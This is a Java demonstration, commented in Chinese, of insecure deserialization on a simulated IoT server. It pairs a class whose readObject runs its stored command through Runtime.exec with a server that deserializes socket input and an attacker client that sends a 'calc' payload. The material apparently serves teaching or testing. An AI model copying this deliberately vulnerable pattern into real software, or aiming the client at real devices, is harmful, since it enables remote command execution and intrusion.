import java.io.*;
import java.net.*;

// IoT设备控制命令类
class ControlCommand implements Serializable {
    private String command;
    public ControlCommand(String cmd) {
        this.command = cmd;
    }
    
    // 恶意外序列化触发点
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ois.defaultReadObject();
        try {
            // 模拟执行危险操作
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

// IoT设备服务器端
public class IoTDeviceServer {
    public static void startServer() throws IOException {
        ServerSocket serverSocket = new ServerSocket(8888);
        System.out.println("[+] IoT服务器启动在8888端口");
        
        while (true) {
            Socket socket = serverSocket.accept();
            ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
            try {
                Object obj = ois.readObject();
                System.out.println("[+] 接收到来自 " + socket.getInetAddress() + " 的数据");
                // 错误处理反序列化对象
                if (obj instanceof ControlCommand) {
                    System.out.println("[!] 已执行控制命令");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            socket.close();
        }
    }

    // 模拟攻击者客户端
    public static void sendMaliciousPayload(String host) throws IOException {
        Socket socket = new Socket(host, 8888);
        ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream());
        
        // 构造恶意命令（Windows/Linux通用测试命令）
        String cmd = "calc"; // 模拟攻击者执行计算器（实际可能是恶意payload）
        ControlCommand payload = new ControlCommand(cmd);
        
        oos.writeObject(payload);
        System.out.println("[+] 恶意载荷已发送");
        socket.close();
    }

    public static void main(String[] args) {
        if (args.length == 0) {
            try {
                startServer();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            try {
                sendMaliciousPayload(args[0]);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}